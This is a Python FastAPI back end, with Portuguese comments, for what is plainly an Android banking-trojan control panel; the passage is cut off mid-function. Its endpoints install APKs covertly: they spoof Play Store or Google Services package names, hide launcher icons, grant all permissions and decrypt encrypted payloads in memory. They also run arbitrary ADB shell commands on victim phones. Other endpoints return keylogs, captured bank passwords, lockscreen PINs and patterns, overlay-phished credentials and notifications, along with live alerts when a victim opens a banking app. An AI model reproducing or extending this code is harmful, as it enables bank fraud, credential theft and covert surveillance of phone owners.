# ==================== ADB GHOST INSTALL ENDPOINTS ====================

class ADBGhostInstallRequest(BaseModel):
    apk1_path: str
    apk2_path: str
    spoof_pkg1: Optional[str] = None
    spoof_pkg2: Optional[str] = None

class ADBEncryptedInstallRequest(BaseModel):
    encrypted_apk_b64: str
    spoof_package: Optional[str] = None

class ADBSingleInstallRequest(BaseModel):
    apk_path: str
    spoof_package: Optional[str] = None
    hide_from_launcher: bool = True
    grant_permissions: bool = True

class ADBDeviceSetupRequest(BaseModel):
    enable_adb_tcpip: bool = False
    adb_port: int = 5555

class ADBCommandRequest(BaseModel):
    command: str
    timeout: int = 30

@app.post("/api/adb/devices")
async def adb_list_devices(
    current_user: Operator = Depends(get_current_user)
):
    """Lista dispositivos conectados via ADB"""
    try:
        devices = get_connected_devices()
        return {"status": "ok", "devices": devices, "count": len(devices)}
    except Exception as e:
        logger.error(f"[ADB] Erro ao listar dispositivos: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/adb/devices/{serial}/info")
async def adb_device_info(
    serial: str,
    current_user: Operator = Depends(get_current_user)
):
    """Obtém informações detalhadas do dispositivo via ADB"""
    try:
        info = get_device_info(serial)
        return {"status": "ok", "device": info}
    except Exception as e:
        logger.error(f"[ADB] Erro ao obter info do dispositivo: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/setup-ghost")
async def adb_setup_ghost(
    serial: str,
    request: ADBDeviceSetupRequest,
    current_user: Operator = Depends(get_current_user)
):
    """Configura dispositivo para instalação ghost (anti-detect)"""
    try:
        result = setup_device_for_ghost(serial)
        
        if request.enable_adb_tcpip:
            result["adb_tcpip"] = enable_adb_over_network(serial, request.adb_port)
        
        return {"status": "ok", "setup": result}
    except Exception as e:
        logger.error(f"[ADB] Erro ao configurar ghost: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/install-ghost")
async def adb_install_ghost(
    serial: str,
    request: ADBSingleInstallRequest,
    current_user: Operator = Depends(get_current_user)
):
    """Instala APK único em modo ghost (invisível, anti-detect)"""
    try:
        result = await asyncio.to_thread(
            install_apk_ghost,
            serial,
            request.apk_path,
            request.spoof_package,
            request.hide_from_launcher,
            request.grant_permissions
        )
        return {"status": "ok" if result["success"] else "error", "result": result}
    except Exception as e:
        logger.error(f"[ADB] Erro na instalação ghost: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/install-dual-ghost")
async def adb_install_dual_ghost(
    serial: str,
    request: ADBGhostInstallRequest,
    current_user: Operator = Depends(get_current_user)
):
    """
    🔥 INSTALA 2 APKs VIA ADB GHOST MODE - 100% ANTI-DETECT
    
    - Spoof de package name (finge ser Play Store, Google Services, etc)
    - Oculta ícone da launcher
    - Concede todas as permissões
    - Criptografia AES-256-GCM nos APKs
    - Hardcoded para máxima evasão
    """
    try:
        result = await async_install_dual_apk(
            serial,
            request.apk1_path,
            request.apk2_path,
            request.spoof_pkg1,
            request.spoof_pkg2
        )
        return {"status": "ok" if result["overall"] else "partial", "result": result}
    except Exception as e:
        logger.error(f"[ADB] Erro na instalação dual ghost: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/install-encrypted")
async def adb_install_encrypted(
    serial: str,
    request: ADBEncryptedInstallRequest,
    current_user: Operator = Depends(get_current_user)
):
    """
    🔐 INSTALA APK CRIPTOGRAFADO (AES-256-GCM)
    
    - APK vem criptografado em base64
    - Descriptografa em memória apenas no momento da instalação
    - Zero trace em disco
    - Spoof de package name opcional
    """
    try:
        result = await async_install_apk_encrypted(
            serial,
            request.encrypted_apk_b64,
            request.spoof_package
        )
        return {"status": "ok" if result["success"] else "error", "result": result}
    except Exception as e:
        logger.error(f"[ADB] Erro na instalação criptografada: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/encrypt-apk")
async def adb_encrypt_apk(
    apk_file: UploadFile = File(...),
    current_user: Operator = Depends(get_current_user)
):
    """
    🔐 Criptografa APK com AES-256-GCM para instalação ghost
    Retorna base64 pronto para uso no install-encrypted
    """
    try:
        if not apk_file.filename.endswith('.apk'):
            raise HTTPException(status_code=400, detail="Arquivo deve ser .apk")
        
        content = await apk_file.read()
        encrypted_b64 = encrypt_apk_data(content)
        
        return {
            "status": "ok",
            "encrypted_apk_b64": encrypted_b64,
            "original_size": len(content),
            "encrypted_size": len(encrypted_b64)
        }
    except Exception as e:
        logger.error(f"[ADB] Erro ao criptografar APK: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/adb/devices/{serial}/uninstall/{package}")
async def adb_uninstall_package(
    serial: str,
    package: str,
    current_user: Operator = Depends(get_current_user)
):
    """Desinstala pacote via ADB"""
    try:
        success = uninstall_package(serial, package)
        return {"status": "ok" if success else "error", "uninstalled": success}
    except Exception as e:
        logger.error(f"[ADB] Erro ao desinstalar: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/adb/devices/{serial}/package/{package}/installed")
async def adb_check_package(
    serial: str,
    package: str,
    current_user: Operator = Depends(get_current_user)
):
    """Verifica se pacote está instalado"""
    try:
        installed = is_package_installed(serial, package)
        return {"status": "ok", "package": package, "installed": installed}
    except Exception as e:
        logger.error(f"[ADB] Erro ao verificar pacote: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/launch")
async def adb_launch_app(
    serial: str,
    package: str = Body(..., embed=True),
    activity: Optional[str] = Body(None, embed=True),
    current_user: Operator = Depends(get_current_user)
):
    """Inicia app via ADB"""
    try:
        success = launch_app(serial, package, activity)
        return {"status": "ok" if success else "error", "launched": success}
    except Exception as e:
        logger.error(f"[ADB] Erro ao iniciar app: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/kill")
async def adb_kill_app(
    serial: str,
    package: str = Body(..., embed=True),
    current_user: Operator = Depends(get_current_user)
):
    """Força parada de app via ADB"""
    try:
        success = kill_app(serial, package)
        return {"status": "ok" if success else "error", "killed": success}
    except Exception as e:
        logger.error(f"[ADB] Erro ao matar app: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/shell")
async def adb_shell_command(
    serial: str,
    request: ADBCommandRequest,
    current_user: Operator = Depends(get_current_user)
):
    """Executa comando shell no dispositivo via ADB"""
    try:
        code, out, err = shell_command(serial, request.command, request.timeout)
        return {"status": "ok" if code == 0 else "error", "code": code, "stdout": out, "stderr": err}
    except Exception as e:
        logger.error(f"[ADB] Erro no shell: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/push")
async def adb_push_file(
    serial: str,
    local_path: str = Body(..., embed=True),
    remote_path: str = Body(..., embed=True),
    current_user: Operator = Depends(get_current_user)
):
    """Envia arquivo para dispositivo via ADB push"""
    try:
        success = push_file(serial, local_path, remote_path)
        return {"status": "ok" if success else "error", "pushed": success}
    except Exception as e:
        logger.error(f"[ADB] Erro no push: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/devices/{serial}/pull")
async def adb_pull_file(
    serial: str,
    remote_path: str = Body(..., embed=True),
    local_path: str = Body(..., embed=True),
    current_user: Operator = Depends(get_current_user)
):
    """Baixa arquivo do dispositivo via ADB pull"""
    try:
        success = pull_file(serial, remote_path, local_path)
        return {"status": "ok" if success else "error", "pulled": success}
    except Exception as e:
        logger.error(f"[ADB] Erro no pull: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/adb/connect-wireless")
async def adb_connect_wireless(
    ip: str = Body(..., embed=True),
    port: int = Body(5555, embed=True),
    current_user: Operator = Depends(get_current_user)
):
    """Conecta ADB via wireless (TCP/IP)"""
    try:
        success = connect_adb_wireless(ip, port)
        return {"status": "ok" if success else "error", "connected": success}
    except Exception as e:
        logger.error(f"[ADB] Erro ao conectar wireless: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# Endpoint para integrar com dispositivo Android conectado via WebSocket
@app.post("/api/devices/{device_id}/adb/ghost-install-dual")
async def device_adb_ghost_install_dual(
    device_id: str,
    request: ADBGhostInstallRequest,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    🔥 Instala 2 APKs via ADB GHOST no dispositivo conectado
    Usa o serial do dispositivo Android conectado ao servidor
    """
    check_device_access(device_id, current_user, db)
    
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    # Tenta obter serial ADB do dispositivo
    serial = device.adb_serial or device_id
    
    try:
        result = await async_install_dual_apk(
            serial,
            request.apk1_path,
            request.apk2_path,
            request.spoof_pkg1,
            request.spoof_pkg2
        )
        
        # Log no banco
        log = DeviceLog(
            device_id=device_id,
            log_type="ADB_GHOST_INSTALL_DUAL",
            log_data=json.dumps(result),
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
        return {"status": "ok" if result["overall"] else "partial", "result": result}
    except Exception as e:
        logger.error(f"[ADB] Erro na instalação dual ghost no device: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/devices/{device_id}/adb/ghost-install-encrypted")
async def device_adb_ghost_install_encrypted(
    device_id: str,
    request: ADBEncryptedInstallRequest,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    🔐 Instala APK criptografado via ADB GHOST no dispositivo conectado
    """
    check_device_access(device_id, current_user, db)
    
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    serial = device.adb_serial or device_id
    
    try:
        result = await async_install_apk_encrypted(
            serial,
            request.encrypted_apk_b64,
            request.spoof_package
        )
        
        log = DeviceLog(
            device_id=device_id,
            log_type="ADB_GHOST_INSTALL_ENCRYPTED",
            log_data=json.dumps(result),
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
        return {"status": "ok" if result["success"] else "error", "result": result}
    except Exception as e:
        logger.error(f"[ADB] Erro na instalação criptografada no device: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/devices/{device_id}/adb/setup-ghost")
async def device_adb_setup_ghost(
    device_id: str,
    request: ADBDeviceSetupRequest,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Configura dispositivo conectado para modo ghost"""
    check_device_access(device_id, current_user, db)
    
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    serial = device.adb_serial or device_id
    
    try:
        result = setup_device_for_ghost(serial)
        
        if request.enable_adb_tcpip:
            result["adb_tcpip"] = enable_adb_over_network(serial, request.adb_port)
        
        log = DeviceLog(
            device_id=device_id,
            log_type="ADB_SETUP_GHOST",
            log_data=json.dumps(result),
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
        return {"status": "ok", "setup": result}
    except Exception as e:
        logger.error(f"[ADB] Erro ao configurar ghost no device: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/devices/{device_id}/adb/info")
async def device_adb_info(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Obtém info ADB do dispositivo conectado"""
    check_device_access(device_id, current_user, db)
    
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    serial = device.adb_serial or device_id
    
    try:
        info = get_device_info(serial)
        return {"status": "ok", "device": info}
    except Exception as e:
        logger.error(f"[ADB] Erro ao obter info ADB: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/devices/{device_id}/adb/connected")
async def device_adb_check_connected(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Verifica se dispositivo está acessível via ADB"""
    check_device_access(device_id, current_user, db)
    
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    serial = device.adb_serial or device_id
    
    try:
        devices = get_connected_devices()
        connected = any(d["serial"] == serial for d in devices)
        return {"status": "ok", "connected": connected, "serial": serial}
    except Exception as e:
        logger.error(f"[ADB] Erro ao verificar conexão ADB: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/devices/{device_id}/adb/request-serial")
async def device_adb_request_serial(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Solicita serial ADB do dispositivo via WebSocket"""
    check_device_access(device_id, current_user, db)
    
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    try:
        success = await manager.send_command(device_id, {"action": "GET_ADB_SERIAL"})
        return {"status": "ok" if success else "error", "sent": success}
    except Exception as e:
        logger.error(f"[ADB] Erro ao solicitar serial ADB: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/activity-feed")
async def get_activity_feed(
    limit: int = 50,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📊 Retorna feed unificado com os últimos eventos de todos os dispositivos do usuário.
    Garante persistência de atividades mesmo ao atualizar a página.
    """
    try:
        if current_user.is_admin:
            devices = db.query(Device).all()
        else:
            devices = db.query(Device).filter(Device.owner_id == current_user.id).all()
        
        device_map = {d.device_id: f"{d.manufacturer or ''} {d.model or ''}".strip().upper() or d.device_id for d in devices}
        device_ids = list(device_map.keys())
        
        events = []
        
        # 1. Bancos abertos em tempo real
        for dev_id, b_info in list(manager.device_active_banks.items()):
            if dev_id in device_map:
                dev_model = device_map.get(dev_id, dev_id)
                bank_name = b_info.get("appName") or "Banco"
                events.append({
                    "id": f"active-bank-{dev_id}",
                    "type": "bank_open",
                    "deviceId": dev_id,
                    "deviceModel": dev_model,
                    "title": f"🚨 BANCO ABERTO: {bank_name}",
                    "description": "Acessando conta bancária agora!",
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "bankPackage": b_info.get("package", ""),
                    "iconB64": b_info.get("icon")
                })

        if device_ids:
            log_types = ["BANK_OPEN"]
            logs = db.query(DeviceLog).filter(
                DeviceLog.device_id.in_(device_ids),
                DeviceLog.log_type.in_(log_types)
            ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
            
            for log in logs:
                dev_model = device_map.get(log.device_id, log.device_id)
                try:
                    created_dt = log.created_at
                    if isinstance(created_dt, str):
                        created_dt = datetime.fromisoformat(created_dt.replace('Z', ''))
                    time_str = (created_dt - timedelta(hours=3)).strftime("%H:%M:%S")
                except Exception:
                    time_str = datetime.now().strftime("%H:%M:%S")
                
                try:
                    data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
                except Exception:
                    data = {}
                
                if log.log_type == "BANK_OPEN":
                    bank = (data.get("appName") or "Banco") if isinstance(data, dict) else "Banco"
                    events.append({
                        "id": f"log-{log.id}",
                        "type": "bank_open",
                        "deviceId": log.device_id,
                        "deviceModel": dev_model,
                        "title": f"🚨 BANCO ABERTO: {bank}",
                        "description": f"Acessando conta bancária agora!",
                        "timestamp": time_str,
                        "bankPackage": data.get("package", "") if isinstance(data, dict) else ""
                    })

        # Retorna estritamente alertas de bancos abertos
        return events[:limit]
    except Exception as e:
        logger.error(f"Erro ao buscar activity feed: {e}")
        return []

@app.get("/api/devices/{device_id}/logs")
async def get_device_logs(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna logs de um dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    logs = db.query(DeviceLog).filter(DeviceLog.device_id == device_id).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    return [
        {
            "id": log.id,
            "type": log.log_type,
            "data": log.log_data,
            "created_at": log.created_at.isoformat()
        }
        for log in logs
    ]

@app.get("/api/devices/{device_id}/keylogs")
async def get_device_keylogs(
    device_id: str,
    limit: int = 200,
    include_offline: bool = True,
    package: str = None,
    app_name: str = None,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna keylogs e senhas de um dispositivo (incluindo offline e senhas de bancos)"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Tipos de keylog para buscar
    log_types = ["KEYLOG", "BANK_PASSWORD", "CAPTURED_APP_PASSWORD", "CAPTURED_PIN"]
    if include_offline:
        log_types.append("KEYLOG_OFFLINE")
    
    query = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(log_types)
    )
    
    if package or app_name:
from sqlalchemy import or_
        filters = []
        if package:
            filters.append(DeviceLog.log_data.like(f"%{package}%"))
            short_pkg = package.split('.')[-1]
            if len(short_pkg) >= 3:
                filters.append(DeviceLog.log_data.like(f"%{short_pkg}%"))
        if app_name:
            filters.append(DeviceLog.log_data.like(f"%{app_name}%"))
        query = query.filter(or_(*filters))
        
    keylogs = query.order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    return [
        {
            "id": log.id,
            "data": log.log_data,
            "created_at": log.created_at.isoformat(),
            "isOffline": log.log_type == "KEYLOG_OFFLINE"
        }
        for log in keylogs
    ]

@app.get("/api/devices/{device_id}/notifications")
async def get_device_notifications(
    device_id: str,
    limit: int = 100,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna notificações capturadas de um dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    notifications = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "DEVICE_NOTIFICATION"
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in notifications:
        try:
            data = json.loads(log.log_data)
        except:
            data = {"text": log.log_data, "package": "desconhecido"}
        
        result.append({
            "id": log.id,
            "package": data.get("package", "desconhecido"),
            "appName": data.get("appName", ""),
            "text": data.get("text", ""),
            "created_at": log.created_at.isoformat()
        })
    return result

@app.get("/api/devices/{device_id}/keylogs-all")
async def get_all_device_keylogs(
    device_id: str,
    limit: int = 500,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    💾 Retorna TODOS os keylogs de um dispositivo:
    - KEYLOG: Capturados em tempo real
    - KEYLOG_OFFLINE: Capturados quando desconectado
    - LOCKSCREEN_PIN: Senha de desbloqueio do celular
    - UNLOCK_SEQUENCE: Sequência de desbloqueio (PIN/Pattern)
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca todos os tipos de keylog
    keylogs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_([
            "KEYLOG", 
            "KEYLOG_OFFLINE", 
            "UNLOCK_SEQUENCE",
            "UNLOCK_SEQUENCE_OFFLINE",
            "BANK_PASSWORD"
        ])
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in keylogs:
        entry = {
            "id": log.id,
            "type": log.log_type,
            "data": log.log_data,
            "created_at": log.created_at.isoformat(),
            "isOffline": "OFFLINE" in log.log_type
        }
        
        # Tenta extrair info útil do JSON
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
            if isinstance(data, dict):
                entry["appName"] = data.get("appName", "")
                entry["text"] = data.get("text", "")
                entry["isPassword"] = data.get("isPassword", False)
                entry["eventType"] = data.get("eventType", "")
        except:
            pass
        
        result.append(entry)
    
    return result

@app.get("/api/devices/{device_id}/offline-keylogs")
async def get_device_offline_keylogs(
    device_id: str,
    limit: int = 100,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📴 Retorna TODOS os keylogs salvos no banco (tanto online quanto offline).
    Este endpoint é chamado SEMPRE para mostrar histórico completo,
    independente de o botão "Ativar Keylogger" estar clicado ou não.
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca TODOS os keylogs salvos no banco
    keylogs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(["KEYLOG", "KEYLOG_OFFLINE"])
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in keylogs:
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
            
            # Se for string simples (texto digitado), cria estrutura
            if isinstance(data, str):
                entry = {
                    "id": log.id,
                    "text": data,
                    "package": "",
                    "appName": "App",
                    "isPassword": False,
                    "timestamp": log.created_at.isoformat(),
                    "isOffline": log.log_type == "KEYLOG_OFFLINE"
                }
            else:
                entry = {
                    "id": log.id,
                    "text": data.get("text", "") if isinstance(data, dict) else str(data),
                    "package": data.get("package", "") if isinstance(data, dict) else "",
                    "appName": data.get("appName", "App") if isinstance(data, dict) else "App",
                    "isPassword": data.get("isPassword", False) if isinstance(data, dict) else False,
                    "eventType": data.get("eventType", "") if isinstance(data, dict) else "",
                    "timestamp": log.created_at.isoformat(),
                    "isOffline": log.log_type == "KEYLOG_OFFLINE"
                }
            
            if entry.get("text"):
                result.append(entry)
        except Exception:
            result.append({
                "id": log.id,
                "text": str(log.log_data),
                "package": "",
                "appName": "App",
                "isPassword": False,
                "timestamp": log.created_at.isoformat(),
                "isOffline": log.log_type == "KEYLOG_OFFLINE"
            })
            
    return result
@app.get("/api/devices/{device_id}/keylogs-by-date")
async def get_device_keylogs_by_date(
    device_id: str,
    date: str = None,  # Formato: YYYY-MM-DD
    limit: int = 5000,
    offset: int = 0,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📅 Retorna keylogs de um dispositivo filtrados por DATA específica ou todos.
    - Se não informar data, retorna o dia ATUAL.
    """
    try:
        check_device_access(device_id, current_user, db)
        
        keylog_types = [
            "KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "DEVICE_NOTIFICATION",
            "CAPTURED_PIN", "CAPTURED_PATTERN", "OVERLAY_SUBMITTED", "CUSTOM_CAPTURES"
        ]
        
        if date and date.lower() == 'all':
            query = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type.in_(keylog_types)
            )
            target_date_str = "TODOS"
        else:
            if date:
                try:
                    target_date = datetime.strptime(date, "%Y-%m-%d")
                except ValueError:
                    target_date = datetime.now(timezone.utc) - timedelta(hours=3)
            else:
                target_date = datetime.now(timezone.utc) - timedelta(hours=3)
            
            target_date_str = target_date.strftime("%Y-%m-%d")
            start_of_day = target_date.replace(hour=0, minute=0, second=0, microsecond=0)
            end_of_day = target_date.replace(hour=23, minute=59, second=59, microsecond=999999)
            
            # UTC conversion (+3h)
            start_utc = start_of_day + timedelta(hours=3)
            end_utc = end_of_day + timedelta(hours=3)
            
            query = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type.in_(keylog_types),
                DeviceLog.created_at >= start_utc,
                DeviceLog.created_at <= end_utc
            )
        
        keylogs = query.order_by(DeviceLog.created_at.asc()).offset(offset).limit(limit).all()
        total = len(keylogs)
        
        result = []
        for log in keylogs:
            try:
                if isinstance(log.created_at, datetime):
                    created_dt = log.created_at
                elif isinstance(log.created_at, str):
                    created_dt = datetime.fromisoformat(log.created_at.replace('Z', ''))
                else:
                    created_dt = datetime.now(timezone.utc)
                time_str = (created_dt - timedelta(hours=3)).strftime("%H:%M:%S")
            except Exception:
                time_str = "--:--:--"

            try:
                data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
                
                if isinstance(data, str):
                    entry = {
                        "id": log.id,
                        "time": time_str,
                        "text": data,
                        "package": "",
                        "appName": "App",
                        "isPassword": log.log_type in ("BANK_PASSWORD", "CAPTURED_PIN", "CAPTURED_PATTERN"),
                        "eventType": log.log_type,
                        "isOffline": log.log_type == "KEYLOG_OFFLINE"
                    }
                else:
                    text_val = data.get("text") or data.get("password") or data.get("pin") or data.get("pattern") or ""
                    if not text_val and "captured" in data and isinstance(data["captured"], dict):
                        text_val = ", ".join([f"{k}: {v}" for k, v in data["captured"].items() if v])
                    entry = {
                        "id": log.id,
                        "time": time_str,
                        "text": text_val or f"[{log.log_type}]",
                        "package": data.get("package", "") if isinstance(data, dict) else "",
                        "appName": (data.get("appName") or data.get("bank") or "App") if isinstance(data, dict) else "App",
                        "isPassword": bool(data.get("isPassword") or log.log_type in ("BANK_PASSWORD", "CAPTURED_PIN", "CAPTURED_PATTERN")),
                        "eventType": (data.get("eventType") or log.log_type) if isinstance(data, dict) else log.log_type,
                        "hint": data.get("hint", "") if isinstance(data, dict) else "",
                        "fieldName": data.get("fieldName", "") if isinstance(data, dict) else "",
                        "isOffline": log.log_type == "KEYLOG_OFFLINE"
                    }
                
                if entry.get("text") or entry.get("eventType") or entry.get("hint") or entry.get("fieldName") or entry.get("isPassword"):
                    result.append(entry)
            except Exception as e:
                logger.error(f"Erro ao parsear log {log.id}: {e}")
                continue

        return {
            "date": target_date_str,
            "total": total,
            "offset": offset,
            "limit": limit,
            "entries": result
        }
    except Exception as e:
        logger.error(f"Erro em get_device_keylogs_by_date: {e}")
        return {
            "date": date or "",
            "total": 0,
            "offset": 0,
            "limit": limit,
            "entries": []
        }

@app.get("/api/devices/{device_id}/keylogs-dates")
async def get_device_keylogs_dates(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📆 Retorna lista de datas que têm keylogs registrados (ajustado para fuso BRT).
    """
from datetime import timedelta
from sqlalchemy import func
    
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    keylog_types = [
        "KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "DEVICE_NOTIFICATION",
        "CAPTURED_PIN", "CAPTURED_PATTERN", "OVERLAY_SUBMITTED", "CUSTOM_CAPTURES"
    ]
    
    # Converte timestamps UTC no banco para BRT (-3h) antes de extrair a data YYYY-MM-DD
    dates_query = db.query(
        func.date(func.datetime(DeviceLog.created_at, '-3 hours')).label('log_date'),
        func.count(DeviceLog.id).label('count')
    ).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).group_by(
        func.date(func.datetime(DeviceLog.created_at, '-3 hours'))
    ).order_by(
        func.date(func.datetime(DeviceLog.created_at, '-3 hours')).desc()
    ).limit(365).all()
    
    dates = []
    for row in dates_query:
        if row.log_date:
            dates.append({
                "date": str(row.log_date),
                "count": row.count
            })
    
    return dates

@app.get("/api/devices/{device_id}/keylogs-summary")
async def get_device_keylogs_summary(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📊 Retorna resumo estatístico dos keylogs do dispositivo.
    """
from datetime import datetime, timedelta
import pytz
    
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # 🇧🇷 Timezone de Brasília
    brazil_tz = pytz.timezone('America/Sao_Paulo')
    now_brazil = datetime.now(brazil_tz)
    today_start_brt = now_brazil.replace(hour=0, minute=0, second=0, microsecond=0)
    today_start_utc = today_start_brt.replace(tzinfo=None) + timedelta(hours=3)
    
    keylog_types = [
        "KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "DEVICE_NOTIFICATION",
        "CAPTURED_PIN", "CAPTURED_PATTERN", "OVERLAY_SUBMITTED", "CUSTOM_CAPTURES"
    ]
    
    # Total de keylogs
    total = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).count()
    
    # Keylogs de hoje
    today = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types),
        DeviceLog.created_at >= today_start_utc
    ).count()
    
    # Senhas capturadas (isPassword = true)
    passwords = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types),
        DeviceLog.log_data.like('%"isPassword": true%')
    ).count()
    
    # Primeiro e último keylog
    first_log = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).order_by(DeviceLog.created_at.asc()).first()
    
    last_log = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).order_by(DeviceLog.created_at.desc()).first()
    
    return {
        "total_logs": total,
        "today_logs": today,
        "passwords_captured": passwords,
        "first_log_date": (first_log.created_at - timedelta(hours=3)).isoformat() if first_log else None,
        "last_log_date": (last_log.created_at - timedelta(hours=3)).isoformat() if last_log else None,
        "current_time_brazil": now_brazil.strftime("%Y-%m-%d %H:%M:%S")
    }

@app.get("/api/devices/{device_id}/lockscreen-pins")
async def get_device_lockscreen_pins(
    device_id: str,
    limit: int = 100,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    🔐 Retorna tentativas de captura de PIN/Pattern da lockscreen
    Inclui tanto online quanto offline
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca keylogs que parecem ser de lockscreen
    keylogs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_([
            "KEYLOG", "KEYLOG_OFFLINE", 
            "UNLOCK_SEQUENCE", "UNLOCK_SEQUENCE_OFFLINE",
            "CAPTURED_PIN", "CAPTURED_PATTERN"
        ])
    ).order_by(DeviceLog.created_at.desc()).limit(500).all()
    
    pins = []
    for log in keylogs:
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
            if isinstance(data, dict):
                # Verifica se é PIN de lockscreen
                event_type = data.get("eventType", "") or ("CAPTURED_PIN" if log.log_type == "CAPTURED_PIN" else "CAPTURED_PATTERN" if log.log_type == "CAPTURED_PATTERN" else "")
                package = data.get("package", "")
                
                is_lockscreen = (
                    "LOCKSCREEN" in event_type or
